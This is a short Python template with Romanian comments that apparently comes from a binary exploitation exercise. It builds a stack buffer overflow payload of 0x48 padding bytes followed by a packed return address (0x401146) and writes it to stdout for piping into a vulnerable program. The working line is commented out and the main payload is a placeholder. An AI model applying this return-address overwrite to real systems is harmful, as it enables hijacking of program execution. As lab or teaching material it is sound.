import sys
import struct

# Varianta RD

# pentru text e b'A' * times
# pentru hexa e (0x..).to_bytes(8, 'little')
# intre element punem +

payload = "..."

# Varianta MS

# offset = 0x40 + 8
# address = 0x401146

# payload = offset * b'A' + struct.pack("<Q", address)

sys.stdout.buffer.write(payload)
